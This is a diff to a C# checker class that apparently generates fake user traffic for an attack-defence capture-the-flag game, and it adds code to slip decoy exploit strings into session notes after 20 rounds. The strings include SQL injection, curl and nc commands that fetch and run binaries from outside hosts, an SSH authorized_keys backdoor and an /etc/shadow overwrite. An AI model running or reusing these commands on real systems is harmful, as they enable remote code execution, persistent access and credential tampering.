@@ -12,6 +12,7 @@ namespace GamemasterChecker
 {
     public class FakeUsers
     {
+        private static readonly int RoundsUntilExploits = 20;  //30min with 90s roundtimes
         private static readonly string[] exploits = new string[]
         {
             "\" OR true",
@@ -27,13 +28,34 @@ namespace GamemasterChecker
             "\"; curl https://165.22.31.44:54354/aaa > test_123123; chmod +x test_123123; ./test_123123",
             "nc 10.0.0.68 890 > a.out; chmod +x a.out;",
             "curl 10.0.0.193/expl.py > expl-gamemaster.py; python expl-gamemaster.py | nc 10.0.0.193 8888;",
-            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFwawwfqPSWWfe1TOcvJZkJ73NTzcsBbSqVSl7Y10kOf ed25519-key-20200717\" >> ~/.ssh/authorized_keys",
+            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c echo \"{sshkey}\" >> ~/.ssh/authorized_keys",
             "sfdjveirotagvkeavlökeogetpgj4wefwwrvgagrtegtae\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0 chmod 0777 /etc/shadow;cat a:$1$fnfffc$pGteyHfdsmdsdsffXX4#5:13243:0:99999:7::: > /etc/shadow;",
             "python -c \" \n while True: ",
         };
+        public static string get_ssh_key()
+        {
+            return "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFwawwfqPSWWfe1TOcvJZkJ73NTzcsBbSqVSl7Y10kOf ed25519-key-20200717";
+        }
         public static string get_Exploit ()
         {
-            return exploits[ThreadSafeRandom.Next(exploits.Length)];
+            return exploits[ThreadSafeRandom.Next(exploits.Length)].Replace("{sshkey}", get_ssh_key());
+        }
+        public static string GetFakePassword()
+        {
+            var o = new Faker("de");
+            return o.Internet.Password();
+        }
+        public static string GetFakeSessionNotes(int roundid)
+        {
+            if (roundid > RoundsUntilExploits)
+                if (ThreadSafeRandom.Next(10) == 0)
+                    return get_Exploit();
+            var o = new Faker("de");
+            return o.Random.Bool() switch
+            {
+                true => o.Company.Bs(),
+                false => o.Company.CatchPhrase()
+            };
         }
         public static string GetFakeSession()
         {
